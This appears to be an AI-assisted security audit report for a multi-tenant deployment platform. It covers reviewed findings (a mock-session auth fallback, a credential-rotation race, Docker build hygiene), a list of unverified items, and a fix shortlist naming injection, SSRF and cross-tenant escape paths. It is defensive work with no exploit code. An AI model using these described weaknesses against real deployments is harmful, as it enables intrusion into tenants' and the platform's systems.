165            if (process.env.NODE_ENV === 'development' || process.env.MOCK_DB === 'true') {
166                return response;
167            }
168
169            const isRscRequest = request.nextUrl.searchParams.has('_rsc');
170
171            if (!sessionCookie && !isRscRequest) {
172                return NextResponse.redirect(new URL('
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[refutes]** The cited line exists verbatim, but the claim fails on both of my lens's tests: (1) it is unreachable by any actor in a deployment with MOCK_DB unset, and (2) the thing it allegedly disables is not an authentication gate at all, so even with the precondition met this specific line grants nothing an anonymous attacker cannot already do.

REACHABILITY. `process.env.MOCK_DB` is not attacker-influenceable — it is read from the Edge runtime process environment, never from a header, cookie, query param, or body. No HTTP entry point can set it. So the only path to line 165 is an operator having set MOCK_DB=true on the Cloud Run service. I checked every place the shipped config could set it:
- `env.example` (60 lines, read in full): no MOCK_DB entry — it is not even a documented knob.
- `Dockerfile`: sets only NEXT_TELEMETRY_DISABLED, NODE_ENV=production, PORT, HOSTNAME. No MOCK_DB. The runner stage copies only `public`, `.next/standalone`, `.next/static` — no `.env*` file reaches the runtime image (and the repo's `.env.local` contains no MOCK_DB anyway; `grep -n "MOCK_DB\|NODE_ENV" .env.local` exits 1).
- `.github/workflows/` contains exactly three files — auto-merge-jules.yml, cron-auto-merge.yml, sync-lockfile.yml. There is no deploy workflow at all, so no CI path sets env vars.
- The only documented deploy command, README.md:149-154, is `gcloud run deploy deployify ... --set-env-vars "NEXT_PUBLIC_APP_URL=..."` — one variable, not MOCK_DB.
- No `*.yaml`/`*.yml` service manifest exists anywhere in the repo (only pnpm-lock.yaml).

The finder's plausibility argument — "the same variable is threaded through ~20 production API handlers as a live runtime branch, not a test-only shim" — is backwards and I falsified it directly. `grep -rn "env.MOCK_DB\s*=" src/ scripts/` returns 33 assignment sites and **every single one is inside a `*.test.ts` file** (storage-validator.test.ts, cloudsql.test.ts, migrations.test.ts, dormancy.test.ts, schema-sync.test.ts, remediation-utils.test.ts, firestore-admin.test.ts, storage-branching.test.ts, query/route.test.ts). Production handlers only *read* the flag; the only code that ever *writes* it is the Node test harness. That makes MOCK_DB precisely the "dev-only env var" my lens says to refute on, not a live production branch.

MECHANISM. Even granting the precondition, proxy.ts:165 is not the authentication boundary the title says it is. Read lines 169-177: with MOCK_DB unset and NODE_ENV=production, the check is `if (!sessionCookie ...)` — cookie *presence* only. It never calls verifySessionToken, never touches jose

</details>

### 🟡 MEDIUM — Automated PlanetScale token rotation runs from an unguarded GET and deletes every other 'deployify-rotation-*' password, so two overlapping syncs revoke the credential that is live in Secret Manager
`reliability-races-3` · `src/lib/gcp/external-sync.ts:598`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** The trigger is src/app/api/projects/[id]/storage/[storageId]/sync/route.ts:446-457: `if (daysSinceRotation >= 30 && (storage.type === 'neon' || storage.type === 'planetscale')) { const rotateResult = await rotateProviderToken(id, storage); ... storage.lastRotatedAt = now; ... await updateProject(...) }`. The `lastRotatedAt` guard is only persisted AFTER the whole multi-second rotation finishes, and the handler is a plain GET with no lock. Two overlapping sync calls (two dashboard tabs, a double-clicked Sync button, or handleUpdateBackupPolicy at StorageSection.tsx:825 firing while a manual sync at :592 is in flight) both read lastRotatedAt > 30 days and both rotate. Interleaving: A creates p

**Impact.** Total, self-inflicted database outage for the deployed application, requiring manual credential recovery in the PlanetScale console. The rotation is fully automatic (30-day timer), so it fires without any user action.

**Reviewer correction.** Right defect class, wrong function, wrong gate, and wrong guard story. The `deployify-rotation-*` cleanup at external-sync.ts:598 cannot revoke anything: line 582 passes a full Secret Manager resource path into upsertSecret's bare-`secretId` parameter, which throws before the cleanup is reached, so rotateProviderToken always returns success:false for PlanetScale and `lastRotatedAt` is never persisted (its actual bug is unbounded orphaned readwriter password creation on every poll past day 30, plus permanently broken auto-rotation). The endpoint is also not "unguarded" — it requires an authenticated session and project membership; its real authz gap is only the missing `role === 'viewer'` check that the sibling rotate route has.

The genuine race is in syncExternalConnector, src/lib/gcp/external-sync.ts:141-186: on EVERY authenticated sync GET for a PlanetScale connector with `metadata.autoSync` (no 30-day gate), it mints a `deployify-sync-<ts>` readwriter password, writes it to the connection-string secret at line 261, then DELETEs every other `deployify-sync-*` password. With no lease or in-flight flag anywhere in the repo, two overlapping GETs for the same connector (two dashboard tabs/users, or UI plus `src/cli/index.js:684`) interleave so that the earlier request's cleanup deletes the password the later request just published, leaving the secret pointing at a revoked credential — a DB-connectivity outage until the next successful single sync and a service restart. Availability only: no data exposure, no privilege escalation, requires an authenticated project member and a genuine timing overlap, and it self-repairs on the next clean sync. Related non-racy defect worth noting in the same block: even a single sync deletes the previous password immediately with zero grace period, cutting off already-running Cloud Run instances holding the old connection string. | The claimed exploit is not reachable. What actually exists at this location is a different, non-security defect: the entire Phase 110 auto-rotation feature is silently dead, because sync/route.ts:443-444 coerces Firestore `Timestamp` values (nested storageConfigs dates are never converted by getProjectById, db.ts:1010-1014) through `new Date(...)`, yielding NaN, so the `daysSinceRotation >= 30` gate at line 446 is permanently false. Tokens are never rotated. The unsynchronized cleanup loop at external-sync.ts:594-603 — which deletes every `deployify-rotation-*` password except the one this invocation created, with no lease and with lastRotatedAt only persisted post-hoc at line 450 — is a genuine latent hazard that would become a real self-inflicted outage (concurrent syncs mutually revoking each other's passwords while Secret Manager's `latest` points at a deleted one) the moment the date bug is fixed. It should be fixed together with the date coercion, and the route should also gain a role gate, since checkProjectAccess grants a read-only 'viewer' the same access as an owner here.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/[storageId]/sync/route.ts:26-37 (the guard the finder says is absent):
    const session = await getSession();
    if (!session) { return NextResponse.json({ success: false, error: 'Unauthorized' }, { status: 401 }); }
    const { id, storageId } = await params;
    const access = await checkProjectAccess(session.user.id, id);
    if (!access.allowed) { return NextResponse.json({ success: false, error: access.error }, { status: access.status }); }

src/app/api/projects/[id]/storage/[storageId]/rotate/route.ts:29-31 (role check present here, absent in the sync GET):
    if (access.role === 'viewer') { return NextResponse.json({ error: 'Forbidden: Viewers cannot manage storage' }, { status: 403 }); }

src/lib/gcp/external-sync.ts:580-583 (the throw that makes :598 unreachable):
    // Update Connection String Secret
    if (storage.connectionStringSecretId) {
        await upsertSecret(storage.connectionStringSecretId, newConnStr);
    }

src/lib/gcp/secrets.ts:18-21, 41-43, 64:
    const gcpProjectId = projectId || config.gcp.projectId || process.env.
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** Three of the claim's load-bearing assertions are wrong, but a real race of the same shape exists a few lines away in the same file, so I am not marking this fully refuted.

1) "Unguarded GET" is false. src/app/api/projects/[id]/storage/[storageId]/sync/route.ts:26-37 requires a valid `deployify_session` (getSession) AND `checkProjectAccess(session.user.id, id)`, which 403s any non-member (src/middleware/rbac.ts:8-31). It is member-only, not anonymous. The only real authorization gap is that this GET performs a privileged, destructive credential rotation without the role check that the sibling rotate route explicitly enforces (rotate/route.ts:29 `if (access.role === 'viewer') return 403`) — so a read-only viewer can trigger it. That is a lesser, different finding.

2) The cleanup loop the claim points at (external-sync.ts:598) is unreachable in production. Immediately before it, line 582 calls `upsertSecret(storage.connectionStringSecretId, newConnStr)`. `connectionStringSecretId` is never a bare secret id — every assignment in the repo stores the return value of upsertSecret (projects/route.ts:227, storage/route.ts:159/389, rotate/route.ts:75, db.ts:160), and that return is the FULL resource path `projects/<gcp>/secrets/<id>/versions/latest` (secrets.ts:64). getSecretValue's own signature confirms the stored form: "Full name including version" (secrets.ts:141-142). upsertSecret, however, treats its first arg as a bare id and builds `projects/${gcpProjectId}/secrets/${secretId}` (secrets.ts:18-21), producing a doubly-nested, invalid name; both the create and addVersion branches `throw` on non-OK (secrets.ts:41-43, 60-62). That throw is inside rotateProviderToken's try (line 513) and is caught at 619-623, returning `{success:false}`. So lines 585-607 never execute, and the route's `if (rotateResult.success)` never fires. PlanetScale auto-rotation is effectively dead code that leaks an orphaned readwriter password on every poll once 30 days elapse — the opposite failure mode from the one claimed.

3) Even if it did run, the rotation password is not "the credential that is live in Secret Manager". `syncExternalConnector` runs unconditionally right after the rotation block (route.ts:459) and, for PlanetScale, always mints a fresh `deployify-sync-<ts>` password and overwrites the same secret with it (external-sync.ts:141-161, 260-262). The `deployify-rotation-*` credential would live in the secret for at most a few hundred ms inside the same handler.

What IS real: the identical delete-all-others pattern in syncExternalConnector (external-sync.ts

</details>

### 🔵 LOW — `getSession()` returns a hard-coded enterprise-admin session whenever `MOCK_DB=true`, with no `NODE_ENV` guard — a test hook shipped in the production bundle
`observability-tests-2` · `src/lib/auth.ts:99` · reported by 2 independent dimensions  _(reviewers changed severity: high → **low**)_

**Failure scenario.** `MOCK_DB` is a plain runtime env var, not a build-time constant, and the `MOCK_DB === 'true'` branch is NOT conjoined with any `NODE_ENV` check — so it is live in a production `NODE_ENV=production` container. Set `MOCK_DB=true` on the Cloud Run service (a plausible operator action: `src/lib/firebase.ts:17` uses the same flag to serve mock data, so an operator debugging a Firestore outage, or a revision cloned from staging, would set it) and every cookie-less request to any of the 84 API routes returns `MOCK_SESSION` — user `audit-test`, tier `enterprise`. `src/proxy.ts:165` does the same for the dashboard: `if (process.env.NODE_ENV === 'development' || process.env.MOCK_DB === 'true') { retur

**Impact.** A single env-var misconfiguration converts the whole platform to unauthenticated enterprise-admin access — project listing, env-var reveal, deploys, storage credential rotation, Cloud SQL restore. There is no test asserting the flag is inert under `NODE_ENV=production`, and per finding #1 no test would run anyway. The codebase already knows the correct pattern — `src/app/api/cron/optimize/route.ts

**Reviewer correction.** Accurate restatement: `src/lib/auth.ts:99` and `src/proxy.ts:165` gate their mock-session/auth-bypass fallbacks on `NODE_ENV === 'development' || MOCK_DB === 'true'`, so the MOCK_DB disjunct is not disabled by a production build. This is a fail-open misconfiguration amplifier, not an attack path: no unprivileged HTTP actor can set MOCK_DB (no runtime env mutation exists in src/), no committed Dockerfile, workflow, env file, or manifest sets it, and setting it requires GCP deploy permissions the holder could use to read the database directly. Its blast radius is also far smaller than claimed — MOCK_DB simultaneously replaces Firestore with an in-memory fake (firebase.ts:54) and forces every GCP bearer token to the literal 'mock-gcp-token' (gcp/auth.ts:17), so the resulting anonymous session sees only fabricated data and every real deploy/restore/secret-rotation call fails 401. Correct fix is a one-line hardening: change the disjunct to `process.env.NODE_ENV !== 'production' && (…)`, or have `validateConfig()` throw when MOCK_DB is truthy under NODE_ENV=production. Severity: low (defense-in-depth / operator-error containment). | `src/lib/auth.ts:99` does return a hard-coded enterprise session on `MOCK_DB === 'true'` with no NODE_ENV conjunct, and no startup assertion, config validation, build-time strip, or test prevents that branch from existing in the production bundle. But it is a defense-in-depth / code-hygiene gap, not an exploitable authentication bypass: (a) MOCK_DB is settable only by an operator who already has Cloud Run deploy rights (and therefore already has JWT_SECRET), never by a network attacker, and no committed manifest, workflow, env.example entry, .env.local line, or Dockerfile ENV sets it; (b) the identical flag swaps Firestore for `createMockFirestore()` (firebase.ts:54), makes `getSecretValue()` return the literal `'mock-secret-value'` (secrets.ts:144), and turns `restoreBackup`/`deleteInstance` into fake op-string no-ops (cloudsql.ts:391, 842), so the anonymous caller reaches only synthetic data and cannot read a real project, reveal a real env var, rotate a real credential, or destroy a real Cloud SQL instance; (c) the one unmocked path (Cloud Build) dead-ends because the mock session's `accessToken` is the string `'mock-access-token'`, so `validateRepository()` fails with a 400 before `submitCloudBuild`. The correct framing is "a mock/test hook is compiled into the production image and is not fail-closed against a NODE_ENV=production deployment" — fix by conjoining `process.env.NODE_ENV !== 'production'` at auth.ts:99 and proxy.ts:165, matching the pattern already used at src/app/api/cron/optimize/route.ts:39. Recommended severity: low.

**Verified code:**

```ts
src/lib/auth.ts:88-106 (the claimed line is real and unguarded):
  88  export async function getSession(): Promise<Session | null> {
  89      const cookieStore = await cookies();
  90      const token = decodeURIComponent(cookieStore.get(COOKIE_NAME)?.value || '');
  92      // In dev, if the user explicitly cleared the cookie, respect it
  93      if (process.env.NODE_ENV === 'development' && token === 'deleted') {
  94          return null;
  95      }
  97      if (!token) {
  98          // Fallback for local development if no session exists
  99          if (process.env.NODE_ENV === 'development' || process.env.MOCK_DB === 'true') {
 100              return MOCK_SESSION;
 101          }
 102          return null;
 103      }
 105      return verifySessionToken(token);

src/lib/auth.ts:64-83 (the mock identity — note the fake access token):
  64  const MOCK_USER: User = {
  65      id: 'audit-test',
  73      subscription: {
  74          tier: 'enterprise',
  79  const MOCK_SESSION: Session = {
  80      user: MOCK_USER,
  81      accessToken: 'mock-access-token',

MITIGATION 1
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[refutes]** The quoted line exists exactly as claimed — the `MOCK_DB === 'true'` disjunct is genuinely not conjoined with any NODE_ENV check, and MOCK_DB is a runtime env var (Next only inlines NODE_ENV, not MOCK_DB). So the code reads as described. The claim fails on reachability and on impact.

Reachability: in the stated deployment (NODE_ENV=production, MOCK_DB unset) the branch is unreachable — a cookie-less request falls to `return null` at line 102, and a garbage cookie goes to `verifySessionToken`, which returns null on failure. Nothing an anonymous user, a signed-up tenant, or a viewer team member can send over HTTP influences `process.env.MOCK_DB`: there is no `process.env[x] = y` assignment anywhere in non-test `src/`, and tenant-supplied env vars are written to the *customer's* Cloud Run service, never to the platform process. Flipping this bit requires `run.services.update` on the Deployify Cloud Run service itself — i.e. an actor who already holds GCP deploy rights and could simply read the Firestore data directly. That is the definition of an already-admin precondition plus a dev-only env var. No committed artifact sets it: the Dockerfile pins NODE_ENV=production, ships only the standalone bundle, and neither it, nor any workflow, nor env.example, nor .env.local mentions MOCK_DB. The finder's own note in audit.md:998 concedes this: "the defect is the missing guard, not a present misconfiguration."

Impact: the claimed consequence ("full unauthenticated enterprise-admin access — project listing, env-var reveal, deploys, storage credential rotation, Cloud SQL restore", "the app looks healthy rather than erroring out") is contradicted by the code. The identical flag that produces MOCK_SESSION also swaps Firestore for `createMockFirestore()` (firebase.ts:54) and makes `getGcpAccessToken()` return the literal `'mock-gcp-token'` (gcp/auth.ts:17). So the hypothetical anonymous "enterprise admin" is handed fabricated projects and invoices, and every real GCP mutation — Cloud Run deploy, Cloud Build, Cloud SQL restore/delete, Secret Manager rotation — either short-circuits to a fake operation id or is sent to Google with an invalid bearer token and rejected. There is no path from this flag to real tenant data or a real destructive action. It also means the premise of the exploit narrative is wrong: an operator "debugging a Firestore outage" would not set MOCK_DB in prod, because it serves invented data to every customer — a loud, immediately visible break, not a diagnostic aid.

What remains is a legitimate but low-grade hardening defect: a single

</details>


## ❌ Refuted — false positive, no action needed  <sub>(1)</sub>

### 🟠 HIGH — No .dockerignore: `COPY . .` bakes live production secrets and the host's node_modules into the platform image build
`ops-config-supply-3` · `Dockerfile:13`

**Failure scenario.** Two concrete failures from the same line. (1) Secrets: a developer or CI runs `docker build .` in a checkout. With no .dockerignore the build context includes `.env.local` and the full `.git` directory, and `COPY . .` writes both into the `builder` layer. Anyone who obtains that layer — via `docker build --target builder`, `docker save`, a BuildKit `--cache-to` registry export, or the `-builder` tagged images this codebase itself creates (src/lib/gcp/cloudbuild.ts:316-322 runs `docker build --target builder -t ${imageName}-builder`) — recovers JWT_SECRET, which is the HS256 signing key for every `deployify_session` cookie (src/lib/auth.ts:10 `new TextEncoder().encode(config.jwt.secret)`) AND

**Impact.** Full session forgery and decryption of all stored tenant DB credentials if any builder layer or build cache ever escapes; plus non-reproducible, silently-corrupted images whose dependency tree is the build machine's rather than the lockfile's.

**Reviewer correction.** The accurate, much narrower finding is a build-hygiene defect, not a secret-exposure vulnerability, and its real bite is the *node_modules* half of the claim rather than the secrets half.

Accurate restatement: "Dockerfile:13 `COPY . .` with no `.dockerignore` lets a plain local `docker build .` overwrite the clean `npm ci` dependency tree. Line 12 copies verified `node_modules` from the `deps` stage, then line 13 merges the developer's host `node_modules` (636 entries here, macOS/darwin-arm64 native binaries) on top of it. `npm run build` then traces *those* modules into `.next/standalone/node_modules`, which line 33 ships into the production image — so a locally built image can contain unverified dev-machine dependencies and wrong-platform binaries. The same missing file also places `.env.local` and `.git` in the throwaway `builder` layer."

Corrected severity: low. Justification for the downgrade from high: (a) no secret reaches the pushed/running image — the multi-stage boundary at lines 29/33/34 holds, verified against the actual standalone output; (b) the documented deploy path (`gcloud builds submit`) already excludes `.env*`, `.git`, `node_modules` and `.next` via gcloud's implicit `.gcloudignore` derived from `.gitignore`; (c) exploiting the builder layer requires an actor who already possesses the plaintext checkout, so there is no privilege gain; (d) no HTTP-reachable actor of any privilege level touches this line.

Fix is still worth doing as defense-in-depth and for build correctness — add a root `.dockerignore` containing at minimum `node_modules`, `.next`, `.git`, `.env*`, `npm-debug.log*`, `*.md`, `.claude` — but it should be filed as build hygiene, not as a high-severity secret-exposure vulnerability. | Accurate restatement: "The platform Dockerfile has no .dockerignore, so it relies entirely on gcloud's implicit context filtering to keep .env.local, .git and host node_modules out of the build. On the documented `gcloud builds submit` path this works — gcloud auto-includes .gitignore (which lists .env*, /node_modules, /.next/), so none of those are uploaded — and the multi-stage runner copies only public/.next/standalone/.next/static, so the shipped image is clean regardless. The residual gap is defense-in-depth plus one real build-correctness bug: a manual local `docker build .` places .env.local in the intermediate builder layer (no net new exposure without an export step, and none is configured anywhere in the repo), and Dockerfile:13 `COPY . .` merges the host's node_modules over the clean `npm ci` output from line 12, which can overlay host-architecture native binaries onto the alpine image. Fix by adding a .dockerignore listing .env*, .git, node_modules, .next — cheap, and it removes the dependency on gcloud's incidental behavior." Severity is low, not high: no secret reaches the published image or the Cloud Build context, and the claim's CI scenario is self-contradictory since .env.local is gitignored and therefore absent from any CI checkout, and no workflow runs docker build.

<details><summary>Reviewer reasoning</summary>

**[refutes]** The two literal facts are true — `.dockerignore` is absent and Dockerfile:13 is `COPY . .` — but every step of the exploitation story fails.

1. Nothing sensitive reaches any shipped image. This is a three-stage build. The `runner` stage (lines 20-42) copies exactly three things from `builder`: `/app/public` (7 static assets, no env file), `/app/.next/standalone`, and `/app/.next/static`. I checked the repo's actual standalone output: it is `.next/`, `node_modules/`, `package.json`, `server.js` — no `.env*`, no `.git`. So `.env.local` and `.git` exist only in the discarded intermediate `builder` layer, never in the artifact that is pushed and run. The claim's title ("bakes ... into the platform image") is factually wrong about the shipped image.

2. The documented deploy path never puts the files in the build context at all. README:146 says `gcloud builds submit`. Because `.gitignore` exists and `.gcloudignore` does not, gcloud auto-synthesizes an ignore chooser (gcloudignore.py:364-376) equal to DEFAULT_IGNORE_FILE (`.gcloudignore`, `.git`, `.gitignore`) plus `#!include:.gitignore`, which pulls in `.env*` (line 37), `/node_modules` (line 4) and `/.next/` (line 17). So on the only documented path, `.env.local`, `.git`, `node_modules` and `.next` are stripped before upload — the Cloud Build context does not contain them, and `COPY . .` cannot bake what is not there. The missing `.dockerignore` is masked by the present `.gitignore` on exactly the path the project actually uses.

3. The named exfil vectors do not exist here. `docker build --target builder` and `docker save` both require control of the machine running the build — a developer's laptop that already holds `.env.local` in plaintext on disk. Zero privilege gain. BuildKit `--cache-to` is not configured anywhere in the repo (no `cache-to`, no `buildx`, no registry cache export). No CI workflow builds or pushes the platform image; the three workflows only merge PRs and sync the lockfile. The one `--target builder` in the codebase (cloudbuild.ts:317) belongs to the *customer project* pipeline using a platform-generated Dockerfile, and its `-builder` tag is consumed locally by `docker create` for cache extraction and is never pushed.

4. Reachability, my assigned lens: there is no call graph. A Dockerfile is not executed by any request handler. There is no HTTP entry point — anonymous, tenant, or viewer — that reads, serves, or triggers Dockerfile:13 in a `NODE_ENV=production` deployment with `MOCK_DB` unset. Nor can the runtime serve the file by accident: Next's static handler only serv

</details>


## ⏳ Not yet verified — resume here

These 8 were still in the verification queue when the session was paused. They carry their
**original, unverified** severity from the finder agent.

| id | sev | finding | file |
|---|---|---|---|
| `ai-cost-abuse-8` | medium | Unbounded project buildTimeout lets a tenant run 24-hour Cloud Builds that escape the build-min | `src/app/api/projects/[id]/route.ts` |
| `observability-tests-8` | medium | No error-reporting or APM integration anywhere, and the one 'central error tracker' is write-on | `src/lib/logging/tracker.ts` |
| `ops-config-supply-7` | medium | Two divergent lockfiles are committed and only one is kept in sync, so npm and pnpm builds reso | `pnpm-lock.yaml` |
| `ops-config-supply-8` | medium | Six production dependencies are never imported anywhere, and they contribute most of the critic | `package.json` |
| `product-ux-8` | medium | Account/project deletion has no type-to-confirm, and no modal in the app has dialog semantics,  | `src/components/ui/confirmation-modal.tsx` |
| `reliability-races-6` | medium | Completing a Cloud SQL regional migration overwrites resourceName with the clone and abandons t | `src/app/api/projects/[id]/storage/[storageId]/sync/route.ts` |
| `reliability-races-7` | medium | pruneProjectImages deletes tagged Artifact Registry versions without force=true and never inspe | `src/lib/gcp/artifacts.ts` |
| `reliability-races-8` | medium | Public analytics ingest keeps an in-memory rate-limit Map that is never pruned and is keyed on  | `src/app/api/v1/collect/route.ts` |


---

# PART 6 — Pause state & how to continue

**Session 3 (2026-09-09): IN PROGRESS.** Remediation run `wf_47544e78-715`, script
`audit-state/remediate-workflow.js`, input `audit-state/remediate-input.json`.
It verifies the last 8 findings, designs a non-breaking fix for all 67+ survivors, then produces the
systemic-fix analysis and shipping roadmap. If it is interrupted, its journal is at
`~/.claude/projects/.../subagents/workflows/wf_47544e78-715/journal.jsonl` — salvage partial fixes
from there the same way Part 5 was salvaged.

**Previously paused:** 2026-09-08, session 2, before the 5-hour limit.
**No code has been modified by this audit. `audit.md` and `audit-state/` are the only things created.**

## Where we are

| Phase | Status |
|---|---|
| Baseline health (lint / tests / tsc / npm audit / secret scan) | ✅ done — Part 0 |
| Orchestrator's own deep review | ✅ done — Parts 1, 2, 2b (**27 findings, hand-verified**) |
| 14-dimension agent sweep | ✅ done — 107 raw findings, archived in Part 3 |
| Dedup 107 → 76 | ✅ done — `audit-state/unique-76-findings.json` |
| Adversarial verification (2 lenses each) | 🔶 **68 of 76 done** — Part 5. **8 remaining.** |
| Non-breaking remediation design | ❌ **not started** — this is the main outstanding work |
| Systemic-fix analysis + shipping roadmap | ❌ not started |

## Durable state — all inside `audit-state/` in the repo

| File | What it is |
|---|---|
| `verify-workflow.js` | The verification + remediation + roadmap workflow, findings already inlined. Re-runnable as-is. |
| `verify-input-76.json` | The 76 deduped findings fed to verification. |
| `unique-76-findings.json` | Same 76, with full evidence and dedup provenance. |
| `raw-107-findings.json` | All 107 raw finder outputs before dedup. |
| `verdicts-merged.json` | The 137 verdicts collected so far, keyed by finding id. |
| `verify-run-journal.jsonl` | Full journal of the verification run (`wf_c9d40efe-981`). |
| `find-run-journal.jsonl` | Full journal of the original 14-dimension sweep (`wf_a7288d4e-2e6`). |

> `audit-state/` is **untracked**. Either commit it or add it to `.gitignore` — but do not delete it
> until the audit is closed out; it is the only copy outside the session directory.

## To continue — in order

**Step 1 — finish the last 8 verifications.** They are listed at the end of Part 5.
Re-run the same workflow; it will redo verification for all 76 (there is no cross-session cache),
or trim `FINDINGS` in `audit-state/verify-workflow.js` to just those 8 ids first:

```
Workflow({ scriptPath: "audit-state/verify-workflow.js" })
```

**Step 2 — remediation design.** This is the phase that never ran and it is where the actual value
is. The workflow already contains it (`phase('Remediate')`), with the "nothing may break" constraint
baked into the prompt: backward compatible with existing encrypted blobs and live JWTs, no response
shape changes, no big-bang migration, `MOCK_DB`/dev paths keep working, env-flagged where risky.

**Step 3 — systemic fixes + roadmap.** Also already in the workflow (`phase('Synthesize')`).

## Fix these first — the shortlist

Ordered by risk, not by discovery order. All hand-verified by me, not just by an agent:

1. **SEC-15** — Firestore Data Lab reads Deployify's own control-plane DB → every user, project and audit log on the platform.
2. **SEC-2** — Cloud Build heredoc escape via `buildCommand` → arbitrary commands as Deployify's own service account.
3. **SEC-16** — OAuth callback leaks the session JWT (which embeds a GitHub `repo` token) to an attacker-chosen host.
4. **SEC-17** — `gcpProjectId`/`resourceId` unbound on GCP resource delete → destroy another tenant's database.
5. **SEC-18** — per-user slug uniqueness vs. global Cloud Run names → overwrite another tenant's production service.
6. **SEC-1** — client-chosen `tierId` on payment verify → any paid tier for the cheapest price, renewable forever.
7. **SEC-4 / SEC-5** — proxy forwards `Cookie`/`Authorization` to tenant origins; SSRF guard bypassable to the GCP metadata server.
8. **SEC-3** — ~37 mutating routes never check `role`; a `viewer` can restore backups and roll back production.

Items 1–5 are all **tenant → platform** escapes. Any one of them ends the "multi-tenant" property
of the product. That is the honest headline: **not safe to run with untrusted paying tenants until
1–5 are closed.**

## Verification protocol before changing anything

1. Open the cited `file:line`; confirm the quoted code still matches.
2. Trace reachability from an HTTP entry point yourself.
3. Reproduce against **staging**, never production.
4. Mark each item ✅ / ❌ / ⚠️ inline in this file as you go.

## Ground rules for the fix phase (agreed)

Constraint: **"kuch break na ho existing project ka."** Every fix must:
- stay compatible with data already written — `enc:iv:tag:ciphertext` blobs, existing Firestore docs, live 7-day JWTs;
- not change API response shapes or status codes the current frontend reads;
- avoid big-bang migrations — prefer dual-read / lazy-migrate;
- keep `MOCK_DB` / `NODE_ENV=development` local dev paths working;
- ship incrementally, behind an env flag defaulting to today's behaviour wherever risky.

⚠️ **Known trap:** rotating `JWT_SECRET` today destroys every stored tenant secret, because
`ENCRYPTION_KEY` silently falls back to it and the ciphertext carries no key version (SEC-9).
Fix the key-versioning **before** any credential rotation.
